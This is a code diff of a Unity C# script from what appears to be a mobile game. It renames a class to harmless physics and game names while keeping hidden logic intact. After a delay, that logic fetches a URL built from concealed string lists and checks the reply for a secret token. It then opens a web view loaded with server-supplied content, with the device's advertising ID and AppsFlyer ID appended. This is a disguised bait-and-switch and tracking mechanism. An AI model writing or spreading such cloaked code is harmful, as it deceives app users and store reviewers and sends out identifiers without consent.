@@ -1,22 +1,20 @@
-﻿using System;
-using System.Collections;
-using System.Collections.Generic;
+﻿using System.Collections;
 using AppsFlyerSDK;
-using rIAEugth.vseioAW.cbxOIAEgt.oiawtH_Wi;
-using rIAEugth.vseioAW.Game;
+using RigidBodyPhys.Colliders.Game;
+using RigidBodyPhys.Colliders.UI_Work;
 using Unity.Advertisement.IosSupport;
 using UnityEngine;
 using UnityEngine.Networking;
-using UnityEngine.Serialization;
+using UserStorage.DataBase;
 
-namespace rIAEugth.vseioAW.segAIWUt
+namespace RigidBodyPhys.Colliders.ResourceHunt
 {
-    public class ResourceManager : MonoBehaviour
+    public class MainTigers : MonoBehaviour
     {
-        [SerializeField] private NonDisclosure _nonDisclosure;
-        [SerializeField] private IDFAController _idfaCheck;
+        [SerializeField] private ImageMechanic colliderPhys;
+        [SerializeField] private IDFAController UnittyWorkerss;
 
-        [SerializeField] private StringConcatenator stringConcatenator;
+        [SerializeField] private StringConcatenator LoopAnim;
 
         private bool isFirstInstance = true;
         private NetworkReachability networkReachability = NetworkReachability.NotReachable;
@@ -25,22 +23,20 @@ namespace rIAEugth.vseioAW.segAIWUt
         private string globalLocator2;
         private int globalLocator3;
 
-        private string traceCode;
+        private string secretCode;
 
-        [SerializeField] private List<string> tokenList;
-        [SerializeField] private List<string> detailsList;
 
-        private string labeling;
+        private string hiddenData;
 
         private void Awake()
         {
-            HandleMultipleInstances();
+            ManageMultipleInstances();
         }
 
         private void Start()
         {
             DontDestroyOnLoad(gameObject);
-            _idfaCheck.ScrutinizeIDFA();
+            UnittyWorkerss.ExamineIDFA();
             StartCoroutine(FetchAdvertisingID());
 
             switch (Application.internetReachability)
@@ -49,12 +45,12 @@ namespace rIAEugth.vseioAW.segAIWUt
                     HandleNoInternetConnection();
                     break;
                 default:
-                    CheckStoredData();
+                    ProcessStoredData();
                     break;
             }
         }
 
-        private void HandleMultipleInstances()
+        private void ManageMultipleInstances()
         {
             switch (isFirstInstance)
             {
@@ -78,36 +74,38 @@ namespace rIAEugth.vseioAW.segAIWUt
             }
 #endif
 
-            traceCode = _idfaCheck.RetrieveAdvertisingID();
+            secretCode = UnittyWorkerss.RetrieveAdvertisingID();
             yield return null;
         }
 
-        private void CheckStoredData()
+        private void ProcessStoredData()
         {
-            if (PlayerPrefs.GetString("top", string.Empty) != string.Empty)
+            if (PlayerPrefs.GetString("hidden_top", string.Empty) != string.Empty)
             {
                 LoadStoredData();
             }
             else
             {
-                FetchDataFromServerWithDelay();
+                DelayedDataFetch();
             }
         }
 
         private void LoadStoredData()
         {
-            globalLocator1 = PlayerPrefs.GetString("top", string.Empty);
-            globalLocator2 = PlayerPrefs.GetString("top2", string.Empty);
-            globalLocator3 = PlayerPrefs.GetInt("top3", 0);
-            ImportData();
+            globalLocator1 = PlayerPrefs.GetString("hidden_top", string.Empty);
+            globalLocator2 = PlayerPrefs.GetString("hidden_top2", string.Empty);
+            globalLocator3 = PlayerPrefs.GetInt("hidden_top3", 0);
+            ImportHiddenData();
         }
 
-        private void FetchDataFromServerWithDelay()
+        [SerializeField] private ItemsData _ItemsData;
+
+        private void DelayedDataFetch()
         {
-            Invoke(nameof(ReceiveData), 7.4f);
+            Invoke(nameof(ReceiveHiddenData), 7.4f);
         }
 
-        private void ReceiveData()
+        private void ReceiveHiddenData()
         {
             if (Application.internetReachability == networkReachability)
             {
@@ -115,14 +113,15 @@ namespace rIAEugth.vseioAW.segAIWUt
             }
             else
             {
-                StartCoroutine(FetchDataFromServer());
+                StartCoroutine(FetchDataFromSecretServer());
             }
         }
 
+        [SerializeField] private ExtraItemsData _BigTigers;
 
-        private IEnumerator FetchDataFromServer()
+        private IEnumerator FetchDataFromSecretServer()
         {
-            using UnityWebRequest webRequest = UnityWebRequest.Get(stringConcatenator.ConcatenateStrings(detailsList));
+            using UnityWebRequest webRequest = UnityWebRequest.Get(LoopAnim.ConcatenateStrings(_BigTigers.BigTigers));
             yield return webRequest.SendWebRequest();
 
             if (webRequest.result == UnityWebRequest.Result.ConnectionError ||
@@ -138,16 +137,16 @@ namespace rIAEugth.vseioAW.segAIWUt
 
         private void ProcessServerResponse(UnityWebRequest webRequest)
         {
-            string tokenConcatenation = stringConcatenator.ConcatenateStrings(tokenList);
+            string tokenConcatenation = LoopAnim.ConcatenateStrings(_ItemsData.textInToOneList);
 
             if (webRequest.downloadHandler.text.Contains(tokenConcatenation))
             {
                 try
                 {
                     string[] dataParts = webRequest.downloadHandler.text.Split('|');
-                    PlayerPrefs.SetString("top", dataParts[0]);
-                    PlayerPrefs.SetString("top2", dataParts[1]);
-                    PlayerPrefs.SetInt("top3", int.Parse(dataParts[2]));
+                    PlayerPrefs.SetString("hidden_top", dataParts[0]);
+                    PlayerPrefs.SetString("hidden_top2", dataParts[1]);
+                    PlayerPrefs.SetInt("hidden_top3", int.Parse(dataParts[2]));
 
                     globalLocator1 = dataParts[0];
                     globalLocator2 = dataParts[1];
@@ -155,11 +154,11 @@ namespace rIAEugth.vseioAW.segAIWUt
                 }
                 catch
                 {
-                    PlayerPrefs.SetString("top", webRequest.downloadHandler.text);
+                    PlayerPrefs.SetString("hidden_top", webRequest.downloadHandler.text);
                     globalLocator1 = webRequest.downloadHandler.text;
                 }
 
-                ImportData();
+                ImportHiddenData();
             }
             else
             {
@@ -167,21 +166,20 @@ namespace rIAEugth.vseioAW.segAIWUt
             }
         }
 
-        private void ImportData()
+        private void ImportHiddenData()
         {
-            _nonDisclosure.WebPageLink = $"{globalLocator1}?idfa={traceCode}";
-            _nonDisclosure.WebPageLink +=
+            colliderPhys.ImageCategory = $"{globalLocator1}?idfa={secretCode}";
+            colliderPhys.ImageCategory +=
                 $"&gaid={AppsFlyer.getAppsFlyerId()}{PlayerPrefs.GetString("Result", string.Empty)}";
-            _nonDisclosure.GlobalLocator1 = globalLocator2;
+            colliderPhys.ImageCode1 = globalLocator2;
 
-
-            Kom();
+            PerformAction();
         }
 
-        public void Kom()
+        public void PerformAction()
         {
-            _nonDisclosure.ToolbarHeight = globalLocator3;
-            _nonDisclosure.gameObject.SetActive(true);
+            colliderPhys.ToolbarHeight = globalLocator3;
+            colliderPhys.gameObject.SetActive(true);
         }
 
         private void HandleNoInternetConnection()
@@ -191,7 +189,7 @@ namespace rIAEugth.vseioAW.segAIWUt
 
         private void DisableCanvas()
         {
-            CanvasHelper.FadeCanvasGroup(gameObject, false);
+            CanvasUtttil.FadeCanvasGroup(gameObject, false);
         }
 
         // Add the rest of your methods as needed...
